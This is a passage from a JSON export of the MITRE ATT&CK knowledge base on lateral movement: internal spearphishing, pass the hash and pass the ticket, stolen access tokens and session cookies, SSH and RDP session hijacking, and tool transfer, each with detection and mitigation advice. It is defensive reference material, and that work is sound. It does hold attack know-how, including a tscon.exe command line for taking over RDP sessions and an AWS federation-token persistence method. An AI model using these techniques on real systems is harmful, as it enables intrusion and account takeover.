Content"],"mitigations":[{"id":"M1016","name":"Vulnerability Scanning","description":"Regularly scan the internal network for available services to identify new and potentially vulnerable services."},{"id":"M1019","name":"Threat Intelligence Program","description":"Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization."},{"id":"M1026","name":"Privileged Account Management","description":"Minimize permissions and access for service accounts to limit impact of exploitation."},{"id":"M1030","name":"Network Segmentation","description":"Segment networks and systems appropriately to reduce access to critical systems and services to controlled methods."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Minimize available services to only those that are necessary."},{"id":"M1048","name":"Application Isolation and Sandboxing","description":"Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of exploitation. Risks of additional exploits and weaknesses in these systems may still exist. <a href=\"https://arstechnica.com/information-technology/2017/03/hack-that-escapes-vm-by-exploiting-edge-browser-fetches-105000-at-pwn2own/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ars Technica Pwn2Own 2017 VM Escape)</a>"},{"id":"M1050","name":"Exploit Protection","description":"Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. <a href=\"https://blogs.technet.microsoft.com/srd/2017/08/09/moving-beyond-emet-ii-windows-defender-exploit-guard/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Moving Beyond EMET)</a> Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. <a href=\"https://en.wikipedia.org/wiki/Control-flow_integrity\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Control Flow Integrity)</a> Many of these protections depend on the architecture and target application binary for compatibility and may not work for all software or services targeted."},{"id":"M1051","name":"Update Software","description":"Update software regularly by employing patch management for internal enterprise endpoints and servers."}],"subTechniques":[]},{"id":"T1534","name":"Internal Spearphishing","description":"After they already have access to accounts or systems within the environment, adversaries may use internal spearphishing to gain access to additional information or compromise other users within the same organization. Internal spearphishing is multi-staged campaign where a legitimate account is initially compromised either by controlling the user's device or by compromising the account credentials of the user. Adversaries may then attempt to take advantage of the trusted internal account to increase the likelihood of tricking more victims into falling for phish attempts, often incorporating Impersonation. <a href=\"https://www.trendmicro.com/en_us/research.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro - Int SP)</a>\n\nFor example, adversaries may leverage Spearphishing Attachment or Spearphishing Link as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through Input Capture on sites that mimic login interfaces.\n\nAdversaries may also leverage internal chat apps, such as Microsoft Teams, to spread malicious content or engage users in attempts to capture sensitive information and/or credentials. <a href=\"https://www.microsoft.com/en-us/security/blog/2023/08/02/midnight-blizzard-conducts-targeted-social-engineering-over-microsoft-teams/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Int SP - chat apps)</a>","detection":"Network intrusion detection systems and email gateways usually do not scan internal email, but an organization can leverage the journaling-based solution which sends a copy of emails to a security service for offline analysis or incorporate service-integrated solutions using on-premise or API-based integrations to help detect internal spearphishing campaigns. <a href=\"https://blog.trendmicro.com/phishing-starts-inside/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro When Phishing Starts from the Inside 2017)</a>","platforms":["Linux","macOS","Office Suite","SaaS","Windows"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow","Application Log: Application Log Content"],"mitigations":[],"subTechniques":[]},{"id":"T1550","name":"Use Alternate Authentication Material","description":"Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process. <a href=\"https://csrc.nist.gov/glossary/term/authentication\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NIST Authentication)</a> <a href=\"https://csrc.nist.gov/glossary/term/multi_factor_authentication\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NIST MFA)</a>\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through Credential Access techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.","detection":"Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. <a href=\"https://technet.microsoft.com/en-us/library/dn487457.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Audit Policy)</a> Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).","platforms":["Containers","IaaS","Identity Provider","Linux","Office Suite","SaaS","Windows"],"dataSources":["Application Log: Application Log Content","Logon Session: Logon Session Creation","Active Directory: Active Directory Credential Request","Web Credential: Web Credential Usage","User Account: User Account Authentication"],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"Consider implementing token binding strategies, such as Azure AD token protection or OAuth Proof of Possession, that cryptographically bind a token to a secret. This may prevent the token from being used without knowledge of the secret or possession of the device the token is tied to. <a href=\"https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-token-protection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Token Protection 2023)</a> <a href=\"https://www.okta.com/blog/2023/06/a-leap-forward-in-token-security-okta-adds-support-for-dpop/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Okta DPoP 2023)</a>"},{"id":"M1015","name":"Active Directory Configuration","description":"Configure Active Directory to prevent use of certain techniques; use SID Filtering, etc."},{"id":"M1018","name":"User Account Management","description":"Enforce the principle of least-privilege. Do not allow a domain user to be in the local administrator group on multiple systems."},{"id":"M1026","name":"Privileged Account Management","description":"Limit credential overlap across systems to prevent the damage of credential compromise and reduce the adversary's ability to perform Lateral Movement between systems."},{"id":"M1027","name":"Password Policies","description":"Set and enforce secure password policies for accounts."},{"id":"M1036","name":"Account Use Policies","description":"Where possible, consider restricting the use of authentication material outside of expected contexts."},{"id":"M1047","name":"Audit","description":"Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses."}],"subTechniques":[{"id":"T1550.001","name":"Application Access Token","description":"Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS). <a href=\"https://auth0.com/blog/why-should-use-accesstokens-to-secure-an-api/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019)</a> \n\nOAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application. <a href=\"https://developer.okta.com/blog/2018/06/20/what-happens-if-your-jwt-is-stolen\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: okta)</a>\n\nFor example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded. <a href=\"https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Identity Platform Access 2019)</a> With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration. <a href=\"https://staaldraad.github.io/2017/08/02/o356-phishing-with-oauth/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Staaldraad Phishing with OAuth 2017)</a>\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account. <a href=\"https://cloud.google.com/iam/docs/creating-short-lived-service-account-credentials\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Service Account Credentials)</a> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_request.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Temporary Security Credentials)</a> The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured – for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges. <a href=\"https://rhinosecuritylabs.com/aws/assume-worst-aws-assume-role-enumeration\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rhino Security Labs Enumerating AWS Roles)</a>\n\nDirect API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.  For example, in AWS environments, an adversary who compromises a user’s AWS API credentials may be able to use the <code>sts:GetFederationToken</code> API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated. <a href=\"https://www.crowdstrike.com/blog/how-adversaries-persist-with-aws-user-federation/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike AWS User Federation Persistence)</a> Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.","detection":"Monitor access token activity for abnormal use and permissions granted to unusual or suspicious applications and APIs. Additionally, administrators should review logs for calls to the AWS Security Token Service (STS) and usage of GCP service accounts in order to identify anomalous actions. <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/cloudtrail-integration.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Logging IAM Calls)</a> <a href=\"https://cloud.google.com/iam/docs/service-account-monitoring\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GCP Monitoring Service Account Usage)</a>","platforms":["Containers","IaaS","Identity Provider","Office Suite","SaaS"],"dataSources":["Web Credential: Web Credential Usage"],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"Consider implementing token binding strategies, such as Azure AD token protection or OAuth Proof of Possession, that cryptographically bind a token to a secret. This may prevent the token from being used without knowledge of the secret or possession of the device the token is tied to. <a href=\"https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-token-protection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Token Protection 2023)</a> <a href=\"https://www.okta.com/blog/2023/06/a-leap-forward-in-token-security-okta-adds-support-for-dpop/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Okta DPoP 2023)</a>"},{"id":"M1021","name":"Restrict Web-Based Content","description":"Update corporate policies to restrict what types of third-party applications may be added to any online service or tool that is linked to the company's information, accounts or network (e.g., Google, Microsoft, Dropbox, Basecamp, GitHub). However, rather than providing high-level guidance on this, be extremely specific—include a list of per-approved applications and deny all others not on the list. Administrators may also block end-user consent through administrative portals, such as the Azure Portal, disabling users from authorizing third-party apps through OAuth and forcing administrative consent. <a href=\"https://docs.microsoft.com/en-us/azure/security/fundamentals/steps-secure-identity#block-end-user-consent\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure AD Admin Consent)</a>"},{"id":"M1036","name":"Account Use Policies","description":"Where possible, consider restricting the use of access tokens outside of expected contexts. For example, in AWS environments, consider using data perimeters to prevent credential use outside of an expected network. <a href=\"https://aws.amazon.com/identity/data-perimeters-on-aws/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Data Perimeters)</a>"},{"id":"M1041","name":"Encrypt Sensitive Information","description":"File encryption should be enforced across email communications containing sensitive information that may be obtained through access to email services."},{"id":"M1047","name":"Audit","description":"Administrators should audit all cloud and container accounts to ensure that they are necessary and that the permissions granted to them are appropriate. Where possible, the ability to request temporary account tokens on behalf of another accounts should be disabled. Additionally, administrators can leverage audit tools to monitor actions that can be conducted as a result of OAuth 2.0 access. For instance, audit reports enable admins to identify privilege escalation actions such as role creations or policy modifications, which could be actions performed after initial access."}]},{"id":"T1550.002","name":"Pass the Hash","description":"Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\n\nWhen performing PtH, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\n\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform Pass the Ticket attacks. <a href=\"https://stealthbits.com/blog/how-to-detect-overpass-the-hash-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Stealthbits Overpass-the-Hash)</a>","detection":"Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.\n\nEvent ID 4768 and 4769 will also be generated on the Domain Controller when a user requests a new ticket granting ticket or service ticket. These events combined with the above activity may be indicative of an overpass the hash attempt. <a href=\"https://stealthbits.com/blog/how-to-detect-overpass-the-hash-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Stealthbits Overpass-the-Hash)</a>","platforms":["Windows"],"dataSources":["Logon Session: Logon Session Creation","Active Directory: Active Directory Credential Request","User Account: User Account Authentication"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Do not allow a domain user to be in the local administrator group on multiple systems."},{"id":"M1026","name":"Privileged Account Management","description":"Limit credential overlap across systems to prevent the damage of credential compromise and reduce the adversary's ability to perform Lateral Movement between systems."},{"id":"M1051","name":"Update Software","description":"Apply patch KB2871997 to Windows 7 and higher systems to limit the default access of accounts in the local administrator group. <a href=\"https://apps.nsa.gov/iaarchive/library/reports/spotting-the-adversary-with-windows-event-log-monitoring.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA Spotting)</a>"},{"id":"M1052","name":"User Account Control","description":"Enable pass the hash mitigations to apply UAC restrictions to local accounts on network logon. The associated Registry key is located <code>HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy</code>.\n\nThrough GPO: Computer Configuration &gt; [Policies] &gt; Administrative Templates &gt; SCM: Pass the Hash Mitigations: Apply UAC restrictions to local accounts on network logons. <a href=\"https://github.com/iadgov/Secure-Host-Baseline/blob/master/Windows/Group%20Policy%20Templates/en-US/SecGuide.adml\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub IAD Secure Host Baseline UAC Filtering)</a>"}]},{"id":"T1550.003","name":"Pass the Ticket","description":"Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\n\nWhen preforming PtT, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access. <a href=\"https://adsecurity.org/?p=556\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity AD Kerberos Attacks)</a> <a href=\"https://web.archive.org/web/20210515214027/https://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GentilKiwi Pass the Ticket)</a>\n\nA Silver Ticket can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint). <a href=\"https://adsecurity.org/?p=556\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity AD Kerberos Attacks)</a>\n\nA Golden Ticket can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory. <a href=\"http://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Campbell 2014)</a>\n\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. Pass the Hash) while also using the password hash to create a valid Kerberos ticket. <a href=\"https://stealthbits.com/blog/how-to-detect-overpass-the-hash-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Stealthbits Overpass-the-Hash)</a>","detection":"Audit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.\n\nEvent ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to \"Integrity check on decrypted field failed\" and indicates misuse by a previously invalidated golden ticket. <a href=\"https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CERT-EU Golden Ticket Protection)</a>","platforms":["Windows"],"dataSources":["User Account: User Account Authentication","Logon Session: Logon Session Creation","Active Directory: Active Directory Credential Request"],"mitigations":[{"id":"M1015","name":"Active Directory Configuration","description":"To contain the impact of a previously generated golden ticket, reset the built-in KRBTGT account password twice, which will invalidate any existing golden tickets that have been created with the KRBTGT hash and other Kerberos tickets derived from it. <a href=\"https://adsecurity.org/?p=483\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity Kerberos and KRBTGT)</a> For each domain, change the KRBTGT account password once, force replication, and then change the password a second time. Consider rotating the KRBTGT account password every 180 days. <a href=\"https://www.stigviewer.com/stig/windows_server_2016/2019-12-12/finding/V-91779\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: STIG krbtgt reset)</a>"},{"id":"M1018","name":"User Account Management","description":"Do not allow a user to be a local administrator for multiple systems."},{"id":"M1026","name":"Privileged Account Management","description":"Limit domain admin account permissions to domain controllers and limited servers. Delegate other admin functions to separate accounts. <a href=\"https://adsecurity.org/?p=556\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity AD Kerberos Attacks)</a>"},{"id":"M1027","name":"Password Policies","description":"Ensure that local administrator accounts have complex, unique passwords."}]},{"id":"T1550.004","name":"Web Session Cookie","description":"Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated. <a href=\"https://wunderwuzzi23.github.io/blog/passthecookie.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pass The Cookie)</a>\n\nAuthentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through Steal Web Session Cookie or Web Cookies, the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.\n\nThere have been examples of malware targeting session cookies to bypass multi-factor authentication systems. <a href=\"https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Mac Crypto Cookies January 2019)</a>","detection":"Monitor for anomalous access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.","platforms":["IaaS","Office Suite","SaaS"],"dataSources":["Application Log: Application Log Content","Web Credential: Web Credential Usage"],"mitigations":[{"id":"M1054","name":"Software Configuration","description":"Configure browsers or tasks to regularly delete persistent cookies."}]}]},{"id":"T1563","name":"Remote Service Session Hijacking","description":"Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.\n\nAdversaries may commandeer these sessions to carry out actions on remote systems. Remote Service Session Hijacking differs from use of Remote Services because it hijacks an existing session rather than creating a new session using Valid Accounts. <a href=\"https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RDP Hijacking Medium)</a> <a href=\"https://matrix.org/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Breach Post-mortem SSH Hijack)</a>","detection":"Use of these services may be legitimate, depending upon the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with that service. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.\n\nMonitor for processes and command-line arguments associated with hijacking service sessions.","platforms":["Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content","Command: Command Execution","Process: Process Creation","Logon Session: Logon Session Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit remote user permissions if remote access is necessary."},{"id":"M1026","name":"Privileged Account Management","description":"Do not allow remote access to services as a privileged account unless necessary."},{"id":"M1027","name":"Password Policies","description":"Set and enforce secure password policies for accounts."},{"id":"M1030","name":"Network Segmentation","description":"Enable firewall rules to block unnecessary traffic between network security zones within a network."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable the remote service (ex: SSH, RDP, etc.) if it is unnecessary."}],"subTechniques":[{"id":"T1563.001","name":"SSH Hijacking","description":"Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.\n\nIn order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial. <a href=\"https://www.slideshare.net/morisson/mistrusting-and-abusing-ssh-13526219\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Slideshare Abusing SSH)</a> <a href=\"https://www.blackhat.com/presentations/bh-usa-05/bh-us-05-boileau.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SSHjack Blackhat)</a> <a href=\"https://www.clockwork.com/news/2012/09/28/602/ssh_agent_hijacking\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Clockwork SSH Agent Hijacking)</a> <a href=\"https://matrix.org/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Breach Post-mortem SSH Hijack)</a>\n\nSSH Hijacking differs from use of SSH because it hijacks an existing SSH session rather than creating a new session using Valid Accounts.","detection":"Use of SSH may be legitimate, depending upon the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time. Also monitor user SSH-agent socket files being used by different users.","platforms":["Linux","macOS"],"dataSources":["Process: Process Creation","Network Traffic: Network Traffic Content","Command: Command Execution","Logon Session: Logon Session Creation","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Ensure proper file permissions are set and harden system to prevent root privilege escalation opportunities."},{"id":"M1026","name":"Privileged Account Management","description":"Do not allow remote access via SSH as root or other privileged accounts."},{"id":"M1027","name":"Password Policies","description":"Ensure SSH key pairs have strong passwords and refrain from using key-store technologies such as ssh-agent unless they are properly protected."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Ensure that agent forwarding is disabled on systems that do not explicitly require this feature to prevent misuse. <a href=\"https://www.symantec.com/connect/articles/ssh-and-ssh-agent\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec SSH and ssh-agent)</a>"}]},{"id":"T1563.002","name":"RDP Hijacking","description":"Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). <a href=\"https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Remote Desktop Services)</a>\n\nAdversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, <code>c:\\windows\\system32\\tscon.exe [session number to be stolen]</code>, an adversary can hijack a session without the need for credentials or prompts to the user. <a href=\"http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RDP Hijacking Korznikov)</a> This can be done remotely or locally and with active or disconnected sessions. <a href=\"https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RDP Hijacking Medium)</a> It can also lead to Remote System Discovery and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools. <a href=\"https://github.com/nccgroup/redsnarf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kali Redsnarf)</a>","detection":"Consider monitoring processes for <code>tscon.exe</code> usage and monitor service creation that uses <code>cmd.exe /k</code> or <code>cmd.exe /c</code> in its arguments to detect RDP session hijacking.\n\nUse of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP.","platforms":["Windows"],"dataSources":["Logon Session: Logon Session Creation","Process: Process Creation","Command: Command Execution","Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit remote user permissions if remote access is necessary."},{"id":"M1026","name":"Privileged Account Management","description":"Consider removing the local Administrators group from the list of groups allowed to log in through RDP."},{"id":"M1028","name":"Operating System Configuration","description":"Change GPOs to define shorter timeouts sessions and maximum amount of time any single session can be active. Change GPOs to specify the maximum amount of time that a disconnected session stays active on the RD session host server. <a href=\"https://technet.microsoft.com/en-us/library/cc754272(v=ws.11).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows RDP Sessions)</a>"},{"id":"M1030","name":"Network Segmentation","description":"Enable firewall rules to block RDP traffic between network security zones within a network."},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Use remote desktop gateways."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable the RDP service if it is unnecessary."},{"id":"M1047","name":"Audit","description":"Audit the Remote Desktop Users group membership regularly. Remove unnecessary accounts and groups from Remote Desktop Users groups."}]}]},{"id":"T1570","name":"Lateral Tool Transfer","description":"Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., Ingress Tool Transfer) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.\n\nAdversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB/Windows Admin Shares to connected network shares or with authenticated connections via Remote Desktop Protocol. <a href=\"https://unit42.paloaltonetworks.com/born-this-way-origins-of-lockergoga/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit42 LockerGoga 2019)</a>\n\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and ftp. In some cases, adversaries may be able to leverage Web Services such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders. <a href=\"https://www.technologyreview.com/2013/08/21/83143/dropbox-and-similar-services-can-sync-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dropbox Malware Sync)</a>","detection":"Monitor for file creation and files transferred within a network using protocols such as SMB or FTP. Unusual processes with internal network connections creating files on-system may be suspicious. Consider monitoring for abnormal usage of utilities and command-line arguments that may be used in support of remote transfer of files. Considering monitoring for alike file hashes or characteristics (ex: filename) that are created on multiple hosts.","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Named Pipe: Named Pipe Metadata","Network Share: Network Share Access","Network Traffic: Network Traffic Flow","Command: Command Execution","Process: Process Creation","File: File Creation","Network Traffic: Network Traffic Content","File: File Metadata"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham 